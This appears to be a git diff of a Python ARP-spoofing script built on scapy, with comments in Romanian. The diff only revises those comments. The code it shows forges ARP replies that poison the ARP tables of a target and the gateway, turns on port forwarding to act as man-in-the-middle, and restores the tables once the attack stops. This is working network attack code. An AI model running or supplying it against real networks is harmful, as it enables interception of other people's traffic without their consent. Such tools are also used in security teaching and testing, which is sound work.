@@ -17,8 +17,8 @@ def getInput():
         parser.error("Please specify the gateway's IP address. Use -h or --help for more details!")
     return arguments
     
-# Functia getMAC trimite un ARP Request la adresa de broadcast a retelei pentru a afla adresa MAC a unui client a carei adresa IP o cunoastem
-# Metoda srp ne permite sa trimitem pachete si, in acelasi timp, sa accesam setul de response-uri primite. 
+# Functia getMAC trimite o cerere ARP la adresa de broadcast a retelei pentru a afla adresa MAC a unui client a carei adresa IP o cunoastem
+# Metoda srp ne permite sa trimitem pachete si, in acelasi timp, sa accesam setul de raspunsuri primite (contine adresa MAC cautata)
 def getMAC(ip):
     macHeader = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arpRequest = scapy.ARP(pdst=ip)
@@ -26,15 +26,15 @@ def getMAC(ip):
     responsesList = scapy.srp(packet, timeout=1, verbose=False)[0]
     return responsesList[0][1].hwsrc
 
-# Functia spoof profita de vulnerabilitatile de securitate ale protocolului ARP (clientii conectati la retea pot sa accepte un ARP Response fara sa fi trimis vreun request
-# Functia trimite un ARP Response catre tinta in numele clientului cu IP-ul "spoofIP" (op=1 -> ARP Request, op=2 -> ARP Response)
-# Astfel, in ARP Table-ul tintei, adresa MAC reala a clientului cu IP-ul "spoofIP" va fi inlocuita cu adresa MAC a atacatorului (a celui care utilizeaza programul)
+# Functia spoof profita de vulnerabilitatile de securitate ale protocolului ARP (clientii conectati la retea pot sa accepte un raspuns ARP fara sa fi trimis vreo cerere)
+# Functia trimite un raspuns ARP catre tinta in numele clientului cu IP-ul "spoofIP" (op=1 -> cerere ARP, op=2 -> raspuns ARP)
+# Astfel, in tabela ARP a tintei, adresa MAC reala a clientului cu IP-ul "spoofIP" va fi inlocuita cu adresa MAC a atacatorului (a celui care utilizeaza programul)
 def spoof(targetIP, spoofIP):
     targetMAC = getMAC(targetIP)
     arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
     scapy.send(arpResponse, verbose=False)
 
-# Functia restoreTable restaureaza ARP Table-urile ambelor victime la valorile initiale dupa ce utilizatorul opreste atacul
+# Functia restoreTable va fi folosita pentru restaurarea tabelelor ARP ale victimelor (tinta si gateway-ul) la valorile initiale dupa ce utilizatorul stopeaza atacul
 def restoreTable(destinationIP, sourceIP):
     destinationMAC = getMAC(destinationIP)
     sourceMAC = getMAC(sourceIP)
@@ -44,7 +44,7 @@ def restoreTable(destinationIP, sourceIP):
 # Program principal
 # Pentru ca datele trimise intre tinta si gateway sa poata fi interceptate, disecate si analizate, se va activa port forwarding pe computerul utilizatorului
 # Scopul activarii port forwarding este ca pachetele trimise de tinta catre gateway si inapoi sa poata circula prin utilizator dupa ce a devenit MITM
-# La fiecare doua secunde, programul "pacaleste" victima ca atacatorul (utilizatorul) este gateway-ul si viceversa
+# La fiecare doua secunde, programul "pacaleste" tinta ca gateway-ul are adresa MAC a atacatorului si gateway-ul ca tinta are adresa MAC a atacatorului
 userInput = getInput()
 print("arpSpoofer on!")
 print("[+] Enabling port forwarding...")
